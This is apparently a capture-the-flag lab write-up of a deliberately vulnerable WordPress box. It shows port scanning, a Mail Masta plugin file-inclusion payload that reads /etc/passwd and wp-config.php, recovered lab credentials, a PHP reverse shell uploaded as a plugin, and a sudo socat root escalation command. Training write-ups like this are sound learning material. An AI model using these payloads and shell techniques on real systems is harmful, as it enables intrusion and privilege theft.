
#### Ip: 10.10.143.12
#### Name: All In One
#### Rating: Easy

----------------------------------------------------------------------

![915c0170a4d0a50cac23bac0f0b1f739.png](../assets/allinone_assets/915c0170a4d0a50cac23bac0f0b1f739.png)


### Enumeration

Lets begin enumerating this box by scanning all TCP ports. I will also speed this scan up by adding the `--min-rate 10000` flag:

```text
┌──(ryan㉿kali)-[~/THM/AllInOne]
└─$ sudo nmap -p- --min-rate 10000 10.10.143.12
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 15:20 CDT
Nmap scan report for 10.10.143.12
Host is up (0.13s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.20 seconds
```

Let's go ahead and emumerate a bit further and port scan with the `-sC` and `-sV` flags set to enumerate versions and also throw some basic Nmap scripts at it:

```text
┌──(ryan㉿kali)-[~/THM/AllInOne]
└─$ sudo nmap -sC -sV 10.10.143.12 -p 21,22,80  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 15:32 CDT
Nmap scan report for 10.10.143.12
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.61.45
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e25c3322765c9366cd969c166ab317a4 (RSA)
|   256 1b6a36e18eb4965ec6ef0d91375859b6 (ECDSA)
|_  256 fbfadbea4eed202b91189d58a06a50ec (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.63 seconds
```

Ok cool, looks like anonymous access is enabled for FTP, so let's check that out first.

ftp.png

It is always a good idea to check out FTP servers with anonymous access in hopes to find something juicy, but no luck today. Didn't find and files in there and was also unable to use the `put` command to upload files. Let's move on to enumerating HTTP next. 

Navigating to the site we find a default landing page for Apache. I'll now use Ferroxbuster to try to enumerate any interesting directories I can find.

dir_wp.png

Nice! We're dealing with WordPress here, which gives us tons of oppurtunity to find a vulnerability. 

Navigating to http://10.10.143.12/wordpress/ we see a classic WordPress layout. Also of note is our first potential username, elyana.

wp_page.png

First thing I like to do when pentesting WordPress is to hit `ctrl + u` and check out the page source, in hopes I can find a WP plugin that may be vulnerable.

Cool, looks like several plugins to choode from. Based on past experience I recall that some versions of the Mail Masta plugin are vulnerable to local file inclusion. Let's start with that. 

A quick Google search lands me at https://www.exploit-db.com/exploits/40290, which outlines a potential LFI at: http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

Let's try it:

passwd.png

Success! We were able to read the /etc/passwd file, and also confirm user elyana is a valid user. Lets see if we can use this to get anyting more interesting off the box. 

### Exploitation

Trying to access the wp-config.php file which is usually located at `/var/www/html/wordpress/wp-config.php` is not working for me. Let's try using PHP filters and converting the file to Base64 in hopes to read the  file:

I'll try this by navigating to view-source:http://10.10.143.12/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php

That worked!

encode.png

I can decode the Base64 in the termial using:

```text
┌──(ryan㉿kali)-[~/THM/AllInOne]
└─$ echo "PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUNCiAqIGluc3RhbGxhdGlvbi4gWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbg0KICogY29weSB0aGlzIGZpbGUgdG8gIndwLWNvbmZpZy5waHAiIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBNeVNRTCBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIEBsaW5rIGh0dHBzOi8vd29yZHByZXNzLm9yZy9zdXBwb3J0L2FydGljbGUvZWRpdGluZy13cC1jb25maWctcGhwLw0KICoNCiAqIEBwYWNrYWdlIFdvcmRQcmVzcw0KICovDQoNCi8vICoqIE15U1FMIHNldHRpbmdzIC0gWW91IGNhbiBnZXQgdGhpcyBpbmZvIGZyb20geW91ciB3ZWIgaG9zdCAqKiAvLw0KLyoqIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZSBmb3IgV29yZFByZXNzICovDQpkZWZpbmUoICdEQl9OQU1FJywgJ3dvcmRwcmVzcycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHVzZXJuYW1lICovDQpkZWZpbmUoICdEQl9VU0VSJywgJ2VseWFuYScgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICdIQGNrbWVAMTIzJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0Kd29yZHByZXNzOw0KZGVmaW5lKCAnV1BfU0lURVVSTCcsICdodHRwOi8vJyAuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLicvd29yZHByZXNzJyk7DQpkZWZpbmUoICdXUF9IT01FJywgJ2h0dHA6Ly8nIC4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJy93b3JkcHJlc3MnKTsNCg0KLyoqI0ArDQogKiBBdXRoZW50aWNhdGlvbiBVbmlxdWUgS2V5cyBhbmQgU2FsdHMuDQogKg0KICogQ2hhbmdlIHRoZXNlIHRvIGRpZmZlcmVudCB1bmlxdWUgcGhyYXNlcyENCiAqIFlvdSBjYW4gZ2VuZXJhdGUgdGhlc2UgdXNpbmcgdGhlIHtAbGluayBodHRwczovL2FwaS53b3JkcHJlc3Mub3JnL3NlY3JldC1rZXkvMS4xL3NhbHQvIFdvcmRQcmVzcy5vcmcgc2VjcmV0LWtleSBzZXJ2aWNlfQ0KICogWW91IGNhbiBjaGFuZ2UgdGhlc2UgYXQgYW55IHBvaW50IGluIHRpbWUgdG8gaW52YWxpZGF0ZSBhbGwgZXhpc3RpbmcgY29va2llcy4gVGhpcyB3aWxsIGZvcmNlIGFsbCB1c2VycyB0byBoYXZlIHRvIGxvZyBpbiBhZ2Fpbi4NCiAqDQogKiBAc2luY2UgMi42LjANCiAqLw0KZGVmaW5lKCAnQVVUSF9LRVknLCAgICAgICAgICd6a1klbSVSRlliOnUsL2xxLWlafjhmakVOZElhU2I9Xms8M1pyLzBEaUxacVB4enxBdXFsaTZsWi05RFJhZ0pQJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfS0VZJywgICdpQVlhazxfJn52OW8re2JAUlBSNjJSOSBUeS0gNlUteUg1YmFVRHs7bmRTaUNbXXFvc3hTQHNjdSZTKWQkSFtUJyApOw0KZGVmaW5lKCAnTE9HR0VEX0lOX0tFWScsICAgICdhUGRfKnNCZj1adWMrK2FdNVZnOT1QfnUwM1EsenZwW2VVZS99KUQ9Ok55aFVZe0tYUl10N300MlVwa1tyNz9zJyApOw0KZGVmaW5lKCAnTk9OQ0VfS0VZJywgICAgICAgICdAaTtUKHt4Vi9mdkUhcyteZGU3ZTRMWDN9TlRAIGo7YjRbejNfZkZKYmJXKG5vIDNPN0ZAc3gwIW95KE9gaCNNJyApOw0KZGVmaW5lKCAnQVVUSF9TQUxUJywgICAgICAgICdCIEFUQGk" | base64 -d
```
This gives us some credentials! Lets try to login to the WP site with them.

creds.png

```
elyana:H@ckme@123
```

After logging in to the WP site it should be smooth sailing from here. Let's try to upload a php-reverse-shell.php as a plugin to get on the box.  

Let's go ahead and update the script with the local IP and the port we'll be listening on:

php_code.png

Going to Plugins > Add New Plugin we can upload the PHP shell as a plugin, navigate to in in the browser, and catch a shell back. 

Once uploaded I navigate to http://10.10.143.12/wordpress/wp-content/uploads/2023/06/php-reverse-shell.php and catch a shell back as www-data.

From here I stabilize the shell and try to grab the user.txt, but get an access denied.

```text
bash-4.4$ cd elyana
bash-4.4$ ls
hint.txt  user.txt
bash-4.4$ cat user.txt
cat: user.txt: Permission denied
```

There's also a file called hint.txt:

```text
bash-4.4$ cat hint.txt
Elyana's user password is hidden in the system. Find it ;)
```
Okey dokey, seeing as H@ckme@123 which we found before isn't working, lets enumerate the `/etc/mysql` folder to see if we can find anymore credentials. 

Cool, we find something juicy in `/etc/mysql/conf.d`

```text
bash-4.4$ ls
mysql.cnf  mysqldump.cnf  private.txt
bash-4.4$ cat private.txt
user: elyana
password: E@syR18ght
```

We can now use `su elyana` and enter the discovered password to switch users. Lets grab the user.txt after decoding it from Base64:

local_flag.png

### Privilege Escalation

Now that we are user elyana, I'll run `sudo -l` to see what, if anything, I can run with root permisions:

sudo.png

Cool, looks like elyana can run socat with root permissions. This should make for an easy win. Navigating to https://gtfobins.github.io and searching for socat I find:

gtfobins.png

Executing `sudo socat stdin exec:/bin/sh` elevates my session to root and I can grab the root.txt flag after decoding it from Base64.

root_flag.png

That's that! This was a fun box that reinforced some valuable concepts. 

Thanks for following along, 

-Ryan 
